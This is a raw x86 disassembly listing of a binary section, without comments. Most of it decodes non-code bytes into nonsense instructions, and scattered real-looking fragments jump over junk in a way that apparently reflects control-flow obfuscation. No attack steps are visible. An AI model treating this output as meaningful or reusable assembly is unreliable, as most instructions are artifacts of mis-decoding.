  424cdb:	and    ebx,DWORD PTR [esi+edx*8+0x1836c118]
  424ce2:	shl    al,1
  424ce4:	(bad)  
  424ce5:	iret   
  424ce6:	dec    ecx
  424ce7:	fxch   st(7)
  424ce9:	xor    esp,DWORD PTR [eax-0x14]
  424cec:	(bad)  
  424ced:	mov    dh,0x42
  424cef:	pop    ss
  424cf0:	mov    al,0xcb
  424cf2:	ss ss jbe 0x424d72
  424cf6:	jne    0x424c91
  424cf8:	mov    ebx,0xba274ede
  424cfd:	inc    edx
  424cfe:	add    bl,al
  424d00:	push   0x65d0aa6d
  424d05:	icebp  
  424d06:	jne    0xc9e55d64
  424d0c:	mov    dl,0xf4
  424d0e:	jo     0x424cd8
  424d10:	xlat   BYTE PTR ds:[ebx]
  424d11:	push   ebx
  424d12:	fnstenv [edi]
  424d14:	aas    
  424d15:	xchg   si,ax
  424d17:	mul    DWORD PTR ds:0x4b44e9fb
  424d1d:	push   es
  424d1e:	mov    ecx,DWORD PTR [ebp-0x18]
  424d21:	jmp    0x424de6
  424d26:	cwde   
  424d27:	add    bh,BYTE PTR [ecx]
  424d29:	cmp    DWORD PTR [ebx+0x551bb8bb],0xc75f3dc4
  424d33:	mov    WORD PTR [edx+eax*1+0x1b23c],?
  424d3a:	test   al,0x0
  424d3c:	add    BYTE PTR [eax],al
  424d3e:	or     al,0x23
  424d40:	mov    bl,0x59
  424d42:	pop    esi
  424d43:	das    
  424d44:	adc    eax,0x615e40e7
  424d49:	cmp    DWORD PTR [ecx],0x2f
  424d4c:	xchg   ebp,eax
  424d4d:	scas   al,BYTE PTR es:[edi]
  424d4e:	mov    eax,ds:0x35cae0ba
  424d53:	mov    BYTE PTR [ecx],ah
  424d55:	dec    esp
  424d56:	aaa    
  424d57:	rcr    BYTE PTR [edx+0x70],cl
  424d5a:	ins    BYTE PTR es:[edi],dx
  424d5b:	sub    DWORD PTR [ebx],ebx
  424d5d:	in     eax,0x44
  424d5f:	xor    DWORD PTR [edi+0x6a],ecx
  424d62:	aaa    
  424d63:	sbb    ecx,DWORD PTR [esi]
  424d65:	add    esi,DWORD PTR [ebp-0x2ef94f45]
  424d6b:	jp     0xe1d495ab
  424d71:	pop    ecx
  424d72:	cmc    
  424d73:	push   cs
  424d74:	in     al,0xae
  424d76:	adc    DWORD PTR [ecx+0x56746c8e],ebp
  424d7c:	in     eax,dx
  424d7d:	pop    ds
  424d7e:	fwait
  424d7f:	mov    edx,ebp
  424d81:	test   DWORD PTR [edx-0x183f5301],0x25d2030
  424d8b:	adc    eax,0xaa0b895d
  424d90:	loopne 0x424dde
  424d92:	sub    BYTE PTR [esi+ecx*8+0x45],ah
  424d96:	jb     0x424d6a
  424d98:	jmp    0xa4da:0x85e4d60d
  424d9f:	int3   
  424da0:	mov    ebp,0x1ac0d28a
  424da5:	in     al,0x9b
  424da7:	in     eax,0xe2
  424da9:	xchg   DWORD PTR [ebx+0x422da553],eax
  424daf:	cld    
  424db0:	int3   
  424db1:	mov    ebx,0x90ba986d
  424db6:	sub    eax,0xade51aa9
  424dbb:	es cli 
  424dbd:	mov    esp,0x58f62dfb
  424dc2:	sbb    al,0x13
  424dc4:	mov    ebx,0x88904877
  424dc9:	jnp    0x424dee
  424dcb:	fimul  WORD PTR ds:0xd4c01542
  424dd1:	aad    0x25
  424dd3:	and    al,0xf6
  424dd5:	mov    ds:0x4fa53388,al
  424dda:	imul   DWORD PTR [ebx+0x7d1f1533]
  424de0:	test   al,0x30
  424de2:	daa    
  424de3:	gs int3 
  424de5:	les    ecx,FWORD PTR [ebx-0x367e1bbb]
  424deb:	test   dl,dh
  424ded:	(bad)  
  424dee:	jmp    FWORD PTR [ebx]
  424df0:	enter  0x458b,0xfc
  424df4:	jmp    0x424eb9
  424df9:	daa    
  424dfa:	repz adc dl,0xd4
  424dfe:	repz ja 0x424df8
  424e01:	and    DWORD PTR [esi+0x165567fb],0x1d
  424e08:	int    0xe4
  424e0a:	mov    dl,0x1
  424e0c:	add    BYTE PTR [eax+0x39000000],ch
  424e12:	(bad)  
  424e13:	inc    ebp
  424e14:	xchg   ebp,eax
  424e15:	xchg   edx,eax
  424e16:	(bad)  
  424e17:	fisubr WORD PTR [eax-0x2d]
  424e1a:	dec    ebp
  424e1b:	in     al,dx
  424e1c:	or     ecx,DWORD PTR [edi]
  424e1e:	cmp    bl,BYTE PTR [edx]
  424e20:	lock pop es
  424e22:	sub    BYTE PTR [eax],dl
  424e24:	xchg   ebp,eax
  424e25:	mov    ebx,0xbe6c298c
  424e2a:	imul   edx,DWORD PTR [edx],0x77
  424e2d:	mov    eax,0x5f3a982d
  424e32:	cmp    DWORD PTR [edx+0x19],ecx
  424e35:	adc    edi,DWORD PTR [edx+esi*1+0x55]
  424e39:	lds    ebp,FWORD PTR [ebx]
  424e3b:	xor    DWORD PTR [esi+ebx*1],eax
  424e3e:	cdq    
  424e3f:	loop   0x424e57
  424e41:	cmp    bh,bl
  424e43:	ret    
  424e44:	enter  0x5333,0x80
  424e48:	mov    ah,0x94
  424e4a:	sub    eax,0x79697f98
  424e4f:	push   ss
  424e50:	mov    eax,ds:0x456de02c
  424e55:	inc    edi
  424e56:	fst    DWORD PTR [ebx]
  424e58:	mov    ds:0xce15dd1c,eax
  424e5d:	adc    al,0x8f
  424e5f:	retf   0x170b
  424e62:	jl     0x424e6e
  424e64:	cmp    cl,BYTE PTR [esi+edx*2]
  424e67:	inc    ecx
  424e68:	sub    ebx,edi
  424e6a:	pop    ss
  424e6b:	retf   
  424e6c:	push   ecx
  424e6d:	xchg   edx,eax
  424e6e:	mov    dh,0xd
  424e70:	push   ds
  424e71:	ds mov ah,0xa8
  424e74:	jb     0x424e7d
  424e76:	mov    esi,0xc40c660e
  424e7b:	jmp    0x424e87
  424e7d:	pop    ebp
  424e7e:	in     eax,0xdf
  424e80:	pop    ecx
  424e81:	(bad)  
  424e83:	mov    eax,ds:0xde7efd43
  424e88:	mov    bh,0xb3
  424e8a:	scas   al,BYTE PTR es:[edi]
  424e8b:	jae    0x424e46
  424e8d:	sti    
  424e8e:	mov    esi,0x6007b81f
  424e93:	rol    bl,1
  424e95:	dec    ebp
  424e96:	shl    DWORD PTR [esp+eiz*2+0xb5e39d4],cl
  424e9d:	ins    DWORD PTR es:[edi],dx
  424e9e:	(bad)  
  424e9f:	mov    dl,0x4
  424ea1:	push   ds
  424ea2:	mov    ds:0xf54d4914,al
  424ea7:	popa   
  424ea8:	mov    ebx,0x1ccf803f
  424ead:	mov    esi,0x47043597
  424eb2:	and    ch,ah
  424eb4:	das    
  424eb5:	push   0x8bc2ca54
  424eba:	push   ebp
  424ebb:	clc    
  424ebc:	imul   eax,eax,0x398b
  424ec2:	mov    esi,DWORD PTR [ebp-0xc]
  424ec5:	sub    eax,edx
  424ec7:	add    eax,0x721e
  424ecc:	jmp    0x424f91
  424ed1:	xchg   ebp,eax
  424ed2:	push   es
  424ed3:	fbstp  TBYTE PTR [ebx+0x26fdfbdf]
  424ed9:	inc    esi
  424eda:	in     eax,0xc4
  424edc:	je     0x424e9f
  424ede:	add    eax,0xb38c33d5
  424ee3:	add    DWORD PTR [eax],eax
  424ee5:	test   al,0x0
  424ee7:	add    BYTE PTR [eax],al
  424ee9:	jl     0x424e75
  424eeb:	popf   
  424eec:	jae    0x424f0f
  424eee:	cld    
  424eef:	gs (bad) 
  424ef1:	(bad)  
  424ef2:	adc    BYTE PTR [eax+eiz*1],0xed
  424ef6:	lahf   
  424ef7:	outs   dx,DWORD PTR ds:[esi]
  424ef8:	(bad)  
  424efa:	pop    ecx
  424efb:	mov    DWORD PTR [edx],esp
  424efd:	push   0x92348bd4
  424f02:	xchg   esi,eax
  424f03:	mov    ecx,0xd550d232
  424f08:	nop
  424f09:	ins    DWORD PTR es:[edi],dx
  424f0a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  424f0b:	dec    esp
  424f0c:	jno    0x424f8a
  424f0e:	sub    bl,bh
  424f10:	das    
  424f11:	and    ecx,DWORD PTR [ebx+0x472c6b49]
  424f17:	dec    esi
  424f18:	outs   dx,DWORD PTR ds:[esi]
  424f19:	sbb    BYTE PTR [ecx+0x12687050],cl
  424f1f:	mov    DWORD PTR [edi],esi
  424f21:	jae    0x424f48
  424f23:	mov    ecx,esp
  424f25:	lock sbb dh,BYTE PTR [edi+0x621cf4c7]
  424f2c:	and    al,0x64
  424f2e:	inc    ecx
  424f2f:	out    0x8a,eax
  424f31:	rol    DWORD PTR [esi-0x7dc0de51],cl
  424f37:	dec    esp
  424f38:	jle    0x424f05
  424f3a:	xor    al,0x47
  424f3c:	mov    ds:0x3fe0d7da,al
  424f41:	lds    eax,FWORD PTR [ebx+0x2f]
  424f44:	sti    
  424f45:	outs   dx,BYTE PTR ds:[esi]
  424f46:	or     edx,DWORD PTR [edx]
  424f48:	pop    ebp
  424f49:	push   ebx
  424f4a:	push   ebp
  424f4b:	int    0x8d
  424f4d:	adc    BYTE PTR [eax-0x26f1ba1e],al
  424f53:	mov    edx,es
  424f55:	xchg   ebx,eax
  424f56:	sbb    BYTE PTR [ecx+edi*2],dh
  424f59:	nop
  424f5a:	sbb    DWORD PTR [esi],edi
  424f5c:	jo     0x424f4a
  424f5e:	mov    ebp,0xa17aaffd
  424f63:	push   ecx
  424f64:	rol    BYTE PTR [eax],1
  424f66:	add    dl,0x76
  424f69:	push   ebp
  424f6a:	popf   
  424f6b:	xor    BYTE PTR [ecx-0x61],al
  424f6e:	popf   
  424f6f:	push   esp
  424f70:	sar    DWORD PTR [edi],cl
  424f72:	aaa    
  424f73:	shr    DWORD PTR [ebx+0x78],0xf6
  424f77:	nop
  424f78:	scas   al,BYTE PTR es:[edi]
  424f79:	loopne 0x424f56
  424f7b:	cmp    DWORD PTR [edi],0x2
  424f7e:	out    dx,eax
  424f7f:	xchg   edx,eax
  424f80:	das    
  424f81:	sbb    DWORD PTR [ebx+0x6c723200],ecx
  424f87:	inc    esp
  424f88:	dec    eax
  424f89:	adc    ebx,DWORD PTR [ebp+0x43612a7d]
  424f8f:	adc    DWORD PTR [esi],ebp
  424f91:	xor    edx,edx
  424f93:	div    esi
  424f95:	and    ecx,0x4210
  424f9b:	mov    edx,0x5a11
  424fa0:	jmp    0x425065
  424fa5:	dec    eax
  424fa6:	ret    
  424fa7:	dec    edx
  424fa8:	xchg   ebx,eax
  424fa9:	retf   
  424faa:	(bad)  
  424fad:	push   cs
  424fae:	sub    ah,ch
  424fb0:	cmp    edi,eax
  424fb2:	or     al,0x78
  424fb4:	ret    
  424fb5:	xor    al,0xb4
  424fb7:	add    DWORD PTR [eax],eax
  424fb9:	test   al,0x0
  424fbb:	add    BYTE PTR [eax],al
  424fbd:	dec    ecx
  424fbe:	mov    ds:0x14e6351e,al
  424fc3:	ret    
  424fc4:	pop    ecx
  424fc5:	and    ch,bl
  424fc7:	adc    eax,0x2537a45f
  424fcc:	jne    0x424fa0
  424fce:	and    al,0xce
  424fd0:	xor    BYTE PTR [ebx-0x50881edb],bh
  424fd6:	mul    bl
  424fd8:	test   al,0x6
  424fda:	mov    dh,0x35
  424fdc:	xchg   edx,eax
  424fdd:	dec    ebx
  424fde:	rcl    BYTE PTR [eax],cl
  424fe0:	dec    edx
  424fe1:	xchg   edx,eax
  424fe2:	ret    
  424fe3:	pop    es
  424fe4:	lds    ebp,FWORD PTR [ebx+0x5bd1965]
  424fea:	lea    eax,[ebx-0x7b45a373]
  424ff0:	mov    DWORD PTR [esi],ebp
  424ff2:	sub    eax,0xe9354d4e
  424ff7:	dec    esp
  424ff8:	or     edx,DWORD PTR [ecx+0x8354550]
  424ffe:	mov    dh,0x98
  425000:	inc    esi
  425001:	stos   BYTE PTR es:[edi],al
  425002:	out    dx,al
  425003:	sahf   
  425004:	mov    ds,WORD PTR [eax+0x6987aaed]
  42500a:	sbb    cl,0xb
  42500d:	pop    edi
  42500e:	imul   ax,WORD PTR [ecx+0x3e],0xb693
  425014:	pop    ss
  425015:	out    0x82,eax
  425017:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  425018:	inc    DWORD PTR [ecx]
  42501a:	mov    bh,0x43
  42501c:	add    eax,0xd68dd9e3
  425021:	adc    al,0xbf
  425023:	cmp    dh,al
  425025:	mov    dl,0x29
  425027:	xor    DWORD PTR [edx],ebx
  425029:	dec    ebp
  42502a:	pushf  
  42502b:	pop    eax
  42502c:	loope  0x425073
  42502e:	mov    BYTE PTR [eax-0x53],ah
  425031:	push   0xe67c24fd
  425036:	mov    cl,0xea
  425038:	hlt    
  425039:	clc    
  42503a:	mov    ch,0xf5
  42503c:	out    dx,al
  42503d:	sbb    eax,0x1f49ec23
  425042:	jae    0x425067
  425044:	(bad)  
  425045:	xchg   ecx,eax
  425046:	jg     0x4250a5
  425048:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  425049:	shr    DWORD PTR [ebp-0x185cae90],0x76
  425050:	adc    DWORD PTR [esi+0xf22bf0f],eax
  425056:	pop    ebx
  425057:	loopne 0x425081
  425059:	int3   
  42505a:	inc    ebp
  42505b:	inc    ebx
  42505c:	lods   al,BYTE PTR ds:[esi]
  42505d:	mov    ds:0xc36cc3c6,al
  425062:	push   ecx
  425063:	and    al,0xb4
  425065:	or     ecx,0x3103
  42506b:	xor    ecx,0x1919
  425071:	mov    edi,0x1d2f
  425076:	sub    edx,eax
  425078:	mov    eax,DWORD PTR [ebp-0x10]
  42507b:	mov    esi,DWORD PTR [ebp-0x14]
  42507e:	or     eax,0x6090
  425083:	xor    eax,esi
  425085:	mov    esi,0x5525
  42508a:	jmp    0x425b34
  42508f:	jmp    0x425154
  425094:	cmp    eax,0xfb3d698f
  425099:	(bad)  
  42509a:	jge    0x42502b
  42509c:	into   
  42509d:	jge    0x4250a7
  42509f:	mov    ebx,0xd2d190f
  4250a4:	fdiv   QWORD PTR [ecx+eax*1+0xa800]
  4250ab:	add    BYTE PTR [ebx+ebp*8-0xd],dl
  4250af:	jl     0x4250ef
  4250b1:	ret    0xcb43
  4250b4:	shl    ebx,1
  4250b6:	out    dx,al
  4250b7:	shl    BYTE PTR [ebp+0xa],1
  4250ba:	dec    edx
  4250bb:	mov    WORD PTR [edx+0x51],ss
  4250be:	add    BYTE PTR [esi],0x49
  4250c1:	push   cs
  4250c2:	push   edi
  4250c3:	and    BYTE PTR [edx-0x3a30df60],ch
  4250c9:	std    
  4250ca:	cmc    
  4250cb:	ins    BYTE PTR es:[edi],dx
  4250cc:	jno    0x425133
  4250ce:	mov    DWORD PTR [edi+ecx*8],edx
  4250d1:	adc    al,0x57
  4250d3:	sub    eax,0x692362e6
  4250d8:	cmp    DWORD PTR ds:0x470fb1ff,edi
  4250de:	add    al,0x6f
  4250e0:	xchg   ebp,eax
  4250e1:	cmp    eax,0x51f3a652
  4250e6:	in     al,dx
  4250e7:	int    0xd5
  4250e9:	fistp  DWORD PTR [eax+0x57]
  4250ec:	jg     0x425105
  4250ee:	mov    DWORD PTR [ebp+0x5d],ebx
  4250f1:	pop    ecx
  4250f2:	xlat   BYTE PTR ds:[ebx]
  4250f3:	inc    esp
  4250f4:	jmp    0x4250a3
  4250f6:	adc    al,0xd7
  4250f9:	aam    0x38
  4250fb:	pop    esi
  4250fc:	sub    eax,0x80e95fbd
  425101:	push   ds
  425102:	in     al,dx
  425103:	enter  0xf392,0x3a
  425107:	lods   eax,DWORD PTR ds:[esi]
  425108:	inc    edx
  425109:	push   ss
  42510a:	mov    cl,0x42
  42510c:	jecxz  0x42516c
  42510e:	out    0x33,al
  425110:	or     dh,bl
  425112:	cpuid  
  425114:	push   ebx
  425115:	mov    ds:0xcfef45a5,eax
  42511a:	int3   
  42511b:	mov    dl,0xa8
  42511d:	dec    esp
  42511e:	push   0x8cd091de
  425123:	repnz cmp al,0x4c
  425126:	add    eax,0x834588a
  42512b:	adc    al,0x7b
  42512d:	jae    0x425168
  42512f:	mov    cl,0xcf
  425131:	sbb    al,0xbe
  425133:	(bad)  [edx+edi*8-0x3d]
  425137:	mov    ah,0x17
  425139:	mov    eax,ds:0xa6ce971
  42513e:	das    
  42513f:	je     0x42510f
  425141:	jmp    0x4251b4
  425143:	xchg   edx,eax
  425144:	shr    BYTE PTR [esi],0x74
  425147:	popa   
  425148:	jge    0x425119
  42514a:	(bad)  
  42514b:	mov    bl,0x89
  42514d:	mov    ebp,0x1d494284
  425152:	jae    0x4250f2
  425154:	mov    DWORD PTR [ebp-0x20],0x43ed
  42515b:	mov    DWORD PTR [ebp-0x18],0x22e8
  425162:	mov    DWORD PTR [ebp-0x1c],0x28e0
  425169:	mov    eax,DWORD PTR [ebp-0x1c]
  42516c:	mov    edx,DWORD PTR [ebp-0x18]
  42516f:	sub    eax,0xdf5
  425174:	or     eax,edx
  425176:	jmp    0x42523b
  42517b:	jo     0x425148
  42517d:	mov    eax,ds:0x7beabbaa
  425182:	fild   DWORD PTR [eax-0x6d]
  425185:	adc    esp,esp
  425187:	data16 std 
  425189:	in     al,0xcd
  42518b:	test   BYTE PTR [ebp+0xa80001],dh
  425191:	add    BYTE PTR [eax],al
  425193:	stc    
  425194:	pop    edi
  425195:	add    BYTE PTR [ecx],cl
  425197:	pop    ecx
  425198:	dec    ebx
  425199:	addr16 loopne 0x425134
  42519c:	neg    BYTE PTR [bp+di-0x29]
  4251a0:	jnp    0x4251a5
  4251a2:	mov    dh,bh
  4251a4:	xchg   BYTE PTR [ecx],ch
  4251a6:	sar    DWORD PTR [esi],1
  4251a8:	sub    cl,BYTE PTR [edi+edx*2-0x5963c8c6]
  4251af:	shl    DWORD PTR [ecx+0x28c0bf6e],1
  4251b5:	xchg   ecx,eax
  4251b6:	dec    ebp
  4251b7:	cmp    eax,0x84636d69
  4251bc:	inc    ecx
  4251bd:	mov    bh,0x1f
  4251bf:	sbb    ebx,esp
  4251c1:	mov    DWORD PTR [ecx+0x11],ecx
  4251c4:	call   0x990719c5
  4251c9:	in     al,dx
  4251ca:	dec    edx
  4251cb:	ins    BYTE PTR es:[edi],dx
  4251cc:	repz inc ecx
  4251ce:	pop    esp
  4251cf:	sar    BYTE PTR [eax+0x774b5154],0x74
  4251d6:	call   0x70a6941e
  4251db:	and    DWORD PTR [eax-0x106b7569],0x62
  4251e2:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4251e3:	push   cs
  4251e4:	add    DWORD PTR [ebx+0x2cb9cc],0xba0630cb
  4251ee:	xchg   ebp,eax
  4251ef:	sbb    edi,DWORD PTR ds:0x65e1c047
  4251f5:	loope  0x425254
  4251f7:	in     al,0xa4
  4251f9:	loop   0x4251d2
  4251fb:	add    ch,BYTE PTR [esi-0x7aa95639]
  425201:	xor    dl,BYTE PTR [esi]
  425203:	inc    esp
  425204:	lahf   
  425205:	or     eax,0xf887786d
  42520a:	fdivr  DWORD PTR [edi-0x42]
  42520d:	fdivr  DWORD PTR [eax]
  42520f:	aam    0xbf
  425211:	push   0xccda3d20
  425216:	add    cl,dl
  425218:	mov    ecx,0xb2c6a923
  42521d:	or     dh,al
  42521f:	xchg   esp,eax
  425220:	ret    
  425221:	dec    ebx
  425222:	(bad)  
  425224:	dec    edi
  425225:	adc    edx,ebx
  425227:	inc    BYTE PTR [eax+0x1d8b6698]
  42522d:	out    dx,al
  42522e:	jbe    0x4251b1
  425230:	xchg   edi,eax
  425231:	lods   eax,DWORD PTR ds:[esi]
  425232:	xchg   esp,eax
  425233:	je     0x42520e
  425235:	mov    bl,0xb6
  425237:	xor    BYTE PTR [edi],al
  425239:	jg     0x425238
  42523b:	mov    edx,DWORD PTR [ebp-0x20]
  42523e:	xor    eax,edx
  425240:	jmp    0x425305
  425245:	nop
  425246:	sub    ecx,DWORD PTR [ecx+eax*4+0x3b9da7bf]
  42524d:	lods   al,BYTE PTR ds:[esi]
  42524e:	fwait
  42524f:	dec    edi
  425250:	fidivr WORD PTR [esi+0x1c]
  425253:	push   0xffffff95
  425255:	sub    al,0xb6
  425257:	add    DWORD PTR [eax],eax
  425259:	test   al,0x0
  42525b:	add    BYTE PTR [eax],al
  42525d:	jnp    0x42520b
  42525f:	nop
  425260:	test   DWORD PTR [edx],ebx
  425262:	sub    esi,DWORD PTR [edi-0x52]
  425265:	adc    ecx,edx
  425267:	sub    BYTE PTR [eax+ebx*1-0x197d6d29],ch
  42526e:	mov    dh,0x84
  425270:	sti    
  425271:	stos   DWORD PTR es:[edi],eax
  425272:	xchg   ebp,ecx
  425274:	sub    ecx,DWORD PTR [esi+0x78]
  425277:	adc    eax,0xc74b9168
  42527c:	fwait
  42527d:	sahf   
  42527e:	mov    dl,BYTE PTR [esp+eax*2-0x15]
  425282:	xchg   ebp,eax
  425283:	add    eax,0xe7da6fdb
  425288:	fld    QWORD PTR [esp+ebp*1-0x4f51b070]
  42528f:	or     edi,DWORD PTR ds:0xe5ed1b4c
  425295:	and    DWORD PTR [edx-0x8fe54f9],0x97fe508d
  42529f:	mov    eax,ds:0x9889b486
  4252a4:	xchg   esp,eax
  4252a5:	xchg   DWORD PTR [ecx+0x21105c0f],ebp
  4252ab:	mov    eax,0x12108f8a
  4252b0:	ins    DWORD PTR es:[edi],dx
  4252b1:	mov    gs,WORD PTR [edi-0x2b]
  4252b4:	pop    eax
  4252b5:	shl    edx,1
  4252b7:	jae    0x425319
  4252b9:	shl    DWORD PTR [esi+0xc],cl
  4252bc:	xchg   BYTE PTR [ecx-0x58],bl
  4252bf:	xchg   ebx,eax
  4252c0:	aas    
  4252c1:	fcmovnu st,st(3)
  4252c3:	xchg   esp,eax
  4252c4:	inc    esp
  4252c5:	mov    ch,al
  4252c7:	das    
  4252c8:	into   
  4252c9:	mov    ss,edx
  4252cb:	retf   
  4252cc:	aas    
  4252cd:	mov    al,0x0
  4252cf:	xchg   esp,eax
  4252d0:	pop    edi
  4252d1:	outs   dx,BYTE PTR ds:[esi]
  4252d2:	pop    edx
  4252d3:	pop    edx
  4252d4:	or     DWORD PTR [edi+0x3e2ee91d],0xfffffff0
  4252db:	mov    eax,0x37e12c78
  4252e0:	loope  0x425351
  4252e2:	or     al,0xd5
  4252e4:	adc    al,0x29
  4252e6:	pop    ecx
  4252e7:	xchg   esi,eax
  4252e8:	(bad)  
  4252e9:	ret    
  4252ea:	jns    0x4252a9
  4252ec:	jl     0x425293
  4252ee:	mov    ecx,0x4b85f373
  4252f3:	stc    
  4252f4:	sub    BYTE PTR ds:0xe4aeb78,cl
  4252fa:	jle    0x4252fb
  4252fc:	add    BYTE PTR [ebx],ah
  4252fe:	add    dh,BYTE PTR [ebx+eiz*4]
  425301:	cmp    ch,cl
  425303:	add    eax,ecx
  425305:	mov    edx,ecx
  425307:	sub    edx,eax
  425309:	add    edx,0x50ec
  42530f:	mov    DWORD PTR [ebp-0x20],edx
  425312:	mov    eax,DWORD PTR [ebp-0x24]
  425315:	mov    ebx,DWORD PTR [ebp-0x28]
  425318:	imul   eax,eax,0x376c
  42531e:	jmp    0x4253e3
  425323:	test   BYTE PTR ds:0x7a8f7a07,cl
  425329:	std    
  42532a:	(bad)  
  42532b:	fstp   TBYTE PTR [edx+edi*4]
  42532e:	ret    
  42532f:	adc    BYTE PTR [ecx],0x9c
  425332:	aas    
  425333:	aam    0xb6
  425335:	add    DWORD PTR [eax],eax
  425337:	test   al,0x0
  425339:	add    BYTE PTR [eax],al
  42533b:	xchg   BYTE PTR [eax-0x6a],bl
  42533e:	shr    DWORD PTR [edx-0xa1d6125],cl
  425344:	sbb    dh,BYTE PTR [esi-0x79]
  425347:	dec    ebp
  425348:	bound  ecx,QWORD PTR [esi]
  42534a:	aas    
  42534b:	and    BYTE PTR [eax+0x3],0xf5
  42534f:	cmp    DWORD PTR [ebx],ecx
  425351:	arpl   WORD PTR [edx+edx*1-0x277da879],di
  425358:	xchg   ecx,eax
  425359:	call   0x939b:0x6a0613d8
  425360:	mov    edx,0x1bce7a08
  425365:	cmp    DWORD PTR [edi+0x27],edi
  425368:	xchg   esp,eax
  425369:	sbb    cl,cl
  42536b:	adc    BYTE PTR [ebx],cl
  42536d:	ss cld 
  42536f:	xor    eax,DWORD PTR [ebx-0x3b90761d]
  425375:	cmp    ecx,esp
  425377:	mov    ecx,0x267d4968
  42537c:	sbb    BYTE PTR [edi+0x3f],al
  42537f:	ret    0xc469
  425382:	std    
  425383:	or     DWORD PTR [esi+0x13101a99],esp
  425389:	out    0xa3,eax
  42538b:	dec    BYTE PTR [ecx+0x551ecf7e]
  425391:	pop    ss
  425392:	jg     0x425395
  425394:	pop    esp
  425395:	rcr    BYTE PTR [edi-0x5ca10c2],1
  42539b:	ret    0xf8be
  42539e:	ficomp DWORD PTR [edx+0x34]
  4253a1:	(bad)  
  4253a2:	sahf   
  4253a3:	mov    bh,0xcb
  4253a5:	dec    esi
  4253a6:	sub    BYTE PTR [ecx+0x21],bl
  4253a9:	test   al,0x40
  4253ab:	jle    0x4253fe
  4253ad:	lock ret 
  4253af:	aam    0xc1
  4253b1:	nop
  4253b2:	mov    ah,0x6f
  4253b4:	sahf   
  4253b5:	stos   BYTE PTR es:[edi],al
  4253b6:	das    
  4253b7:	adc    BYTE PTR [eax+0x1bb933cc],dh
  4253bd:	or     al,0x46
  4253bf:	aaa    
  4253c0:	mov    eax,ds:0x6cc3f638
  4253c5:	push   es
  4253c6:	push   si
  4253c8:	test   eax,0x91e7fe6b
  4253cd:	shl    DWORD PTR [ebx+esi*4],cl
  4253d0:	cmp    eax,0xd61f7a2f
  4253d5:	enter  0x49a2,0x57
  4253d9:	das    
  4253da:	stos   DWORD PTR es:[edi],eax
  4253db:	out    0xa9,al
  4253dd:	jo     0x42541f
  4253df:	push   ecx
  4253e0:	addr16 into 
  4253e2:	fbstp  TBYTE PTR [ebx]
  4253e4:	shl    bh,cl
  4253e6:	repz jmp 0x4254ac
  4253ec:	pop    edx
  4253ed:	aam    0xa7
  4253ef:	and    ch,BYTE PTR [edi+0x32fcdf73]
  4253f5:	loopne 0x4253bc
  4253f7:	les    esi,FWORD PTR ds:0x7c748872
  4253fd:	mov    bh,0x1
  4253ff:	add    BYTE PTR [eax-0x18000000],ch
  425405:	push   edi
  425406:	pop    ebp
  425407:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  425408:	xor    bl,bl
  42540a:	rol    DWORD PTR [eax+0x5bb5022],cl
  425410:	test   eax,0xdad80f21
  425415:	cld    
  425416:	aad    0xe2
  425418:	mov    ecx,0xb57dd965
  42541d:	xchg   esi,eax
  42541e:	int3   
  42541f:	jmp    0xa99d1bc9
  425424:	jle    0x4253c9
  425426:	enter  0x8b63,0xf1
  42542a:	dec    esp
  42542b:	pop    esi
  42542c:	(bad)  
  42542d:	out    dx,al
  42542e:	mov    dh,0xe0
  425430:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  425431:	mov    dl,0xd7
  425433:	imul   ecx,DWORD PTR [edx-0x1c],0x8f1bbbde
  42543a:	imul   edx,DWORD PTR [edi+0x3c4bd33f],0xe08f5e10
  425444:	pushf  
  425445:	test   DWORD PTR [eax],0x38812115
  42544b:	repnz adc dh,ah
  42544e:	sahf   
  42544f:	das    
  425450:	mov    ebp,0x8cf40f4
  425455:	iret   
  425456:	cmc    
  425457:	inc    ebx
  425458:	mov    al,ds:0xa1df73de
  42545d:	arpl   WORD PTR [edi],di
  42545f:	imul   esp,DWORD PTR [eax+0x6c04e605],0xffffffd3
  425466:	pop    ss
  425467:	push   ss
  425468:	mov    cl,0x59
  42546a:	shl    esp,cl
  42546c:	lods   al,BYTE PTR ds:[esi]
  42546d:	test   eax,0x90d915cf
  425472:	pushf  
  425473:	leave  
  425474:	(bad)  
  425475:	mov    ds:0xff3c6965,al
  42547a:	mov    fs,WORD PTR [ebx]
  42547c:	es stos BYTE PTR es:[edi],al
  42547e:	mov    eax,0xbabfb7b
  425483:	push   es
  425484:	push   eax
  425485:	mov    cs,WORD PTR [ebp-0x146b8eb2]
  42548b:	jmp    0x3e6d:0xc1436379
  425492:	cmp    dh,BYTE PTR ds:0xf850d775
  425498:	inc    ebp
  425499:	sbb    eax,0x67ef2fe8
  42549e:	mov    edx,0xf482838b
  4254a3:	stos   BYTE PTR es:[edi],al
  4254a4:	sbb    esi,0xffffffd2
  4254a7:	test   BYTE PTR [edx-0x74e74fdf],cl
  4254ad:	push   ebp
  4254ae:	aam    0xe9
  4254b0:	rol    BYTE PTR [eax],0x0
  4254b3:	add    BYTE PTR [edi-0x609be2e3],al
  4254b9:	fs (bad) 
  4254bb:	push   DWORD PTR [edx]
  4254bd:	aam    0xb8
  4254bf:	lahf   
  4254c0:	add    al,BYTE PTR [ebx]
  4254c2:	jno    0x425503
  4254c4:	and    al,0xb8
  4254c6:	add    DWORD PTR [eax],eax
  4254c8:	test   al,0x0
  4254ca:	add    BYTE PTR [eax],al
  4254cc:	jne    0x425457
  4254ce:	int    0x5b
  4254d0:	dec    eax
  4254d1:	sbb    DWORD PTR [ebp-0x73],edx
  4254d4:	mov    ds:0x46e1dc4b,eax
  4254d9:	lock ror ah,1
  4254dc:	mov    ch,0x31
  4254de:	push   ebx
  4254df:	lock (bad) 
  4254e1:	push   es
  4254e2:	pop    es
  4254e3:	pop    esp
  4254e4:	stos   DWORD PTR es:[edi],eax
  4254e5:	push   ebx
  4254e6:	adc    eax,0xcecbc3fb
  4254eb:	jmp    0x3a65:0x570c2e48
  4254f2:	cmc    
  4254f3:	sub    DWORD PTR [eax-0x22afe2d7],0x67
  4254fa:	int3   
  4254fb:	push   ecx
  4254fc:	push   ecx
  4254fd:	scas   eax,DWORD PTR es:[edi]
  4254fe:	in     eax,dx
  4254ff:	jns    0x425522
  425501:	lea    eax,[eax-0x10aad569]
  425507:	stos   BYTE PTR es:[edi],al
